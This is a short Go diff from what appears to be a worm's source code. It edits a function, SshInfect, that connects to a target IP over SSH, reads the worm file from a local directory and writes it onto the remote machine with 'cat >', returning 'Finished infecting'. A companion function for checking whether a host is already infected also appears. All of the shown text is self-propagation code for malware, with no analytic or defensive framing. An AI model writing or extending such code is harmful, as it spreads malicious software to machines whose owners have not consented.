@@ -115,7 +115,7 @@ func SshCheckInfection(ip string) bool {
 	return false
 }
 
-func SshInfect(ip string) string {
+func SshInfect(ip string, filename string) string {
 	client, session := OpenSSHConnection(ip)
 	if client != nil {
 		defer client.Close()
@@ -123,10 +123,10 @@ func SshInfect(ip string) string {
 	defer session.Close()
 
 	var worm []byte
-	worm = GetFile(worm_dir + "/" + worm_filename)
+	worm = GetFile(worm_dir + "/" + filename)
 	session.Stdin = bytes.NewReader(worm)
-	session.CombinedOutput("cat > " + worm_dir + "/" + worm_filename)
-
+	session.CombinedOutput("cat > " + worm_dir + "/" + filename)
+	
 	return "Finished infecting"
 }
 
